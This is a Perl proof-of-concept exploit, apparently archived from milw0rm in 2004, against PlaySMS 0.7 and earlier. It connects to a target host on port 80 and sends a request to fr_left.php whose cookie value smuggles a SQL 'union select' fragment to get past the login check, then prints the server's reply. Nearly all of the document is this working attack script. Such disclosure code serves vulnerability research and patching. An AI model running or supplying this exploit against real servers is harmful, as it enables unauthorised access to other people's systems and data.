#!/usr/bin/perl 
# PlaySMS version 0.7 and prior SQL Injection PoC 
# Written by Noam Rathaus of Beyond Security Ltd. 
# 

use IO::Socket; 
use strict; 

my $host = $ARGV[0]; 

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" ); 

unless ($remote) { die "cannot connect to http daemon on $host" } 

print "connected "; 

$remote->autoflush(1); 

my $http = "GET /~playsms/fr_left.php HTTP/1.1 
Host: $host:80 
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7) Gecko/20040712 
Firefox/0.9.1 
Accept: 
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 
Accept-Language: en-us,en;q=0.5 
Accept-Encoding: gzip,deflate 
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 
Keep-Alive: 300 
Cookie: vc1=ticket; vc2='%20union%20select%20'ticket; 
Content-Type: application/x-www-form-urlencoded 
Connection: close 

"; 

print "HTTP: [$http] "; 
print $remote $http; 
sleep(1); 
print "Sent "; 

while (<$remote>) 
{ 
print $_; 
} 
print " "; 

close $remote; 

# milw0rm.com [2004-08-19]
